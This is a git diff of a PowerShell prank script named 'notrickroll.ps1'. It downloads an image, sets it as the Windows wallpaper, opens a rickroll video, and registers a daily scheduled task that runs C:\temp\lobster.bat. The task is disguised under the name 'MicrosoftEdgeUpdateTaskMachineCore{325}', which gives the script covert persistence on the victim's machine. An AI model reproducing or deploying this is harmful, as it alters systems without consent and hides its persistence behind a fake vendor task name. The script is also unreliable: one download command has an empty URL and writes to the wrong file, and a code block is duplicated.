e425c6577771ffa399b8a6ceca56688368275ef7
CHONK12 <115587871+CHONK12@users.noreply.github.com>
2022-10-12 13:09:06 -0600

    Update notrickroll.ps1

--- notrickroll.ps1
+++ notrickroll.ps1
@@ -1,21 +1,57 @@
-$MyWallpaper="https://github.com/CHONK12/rickRoll/blob/main/rickroll.jpg"
+$filename = "C:\temp\rickroll.jpg"
+$bat = 'C:\temp\lobster.bat'
+
+#If the file does not exist, create it.
+if (-not(Test-Path -Path $filename -PathType Leaf)) {
+   mkdir C:\temp
+   Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/rickroll.jpg -OutFile C:\temp\rickroll.jpg
+   $MyWallpaper="C:\temp\rickroll.jpg"
 $code = @'
 using System.Runtime.InteropServices;
 namespace Win32{
 
-     public class Wallpaper{
+    public class Wallpaper{
         [DllImport("user32.dll", CharSet=CharSet.Auto)]
-         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
+        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
 
-         public static void SetWallpaper(string thePath){
+        public static void SetWallpaper(string thePath){
             SystemParametersInfo(20,0,thePath,3);
-         }
+        }
     }
- }
+}
 '@
+}
+
+if (-not(Test-Path -Path $bat -PathType Leaf)) {
+   Invoke-WebRequest -Uri  -OutFile C:\temp\rickroll.jpg
+
+}
+if ((Test-Path -Path $filename -PathType Leaf)) {
+
+
+    $MyWallpaper="C:\temp\rickroll.jpg"
+$code = @'
+using System.Runtime.InteropServices;
+namespace Win32{
+
+    public class Wallpaper{
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
+        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
+
+        public static void SetWallpaper(string thePath){
+            SystemParametersInfo(20,0,thePath,3);
+        }
+    }
+}
+'@
+}
+
+
+
 
 add-type $code
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
-$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument https://github.com/CHONK12/rickRoll/blob/main/Blue.ps1
+$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument C:\temp\lobster.bat
 $trigger = New-ScheduledTaskTrigger -Daily -At 3pm
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName ":)" -Description "Ear death"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{325}" -Description "Ear death"
+Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
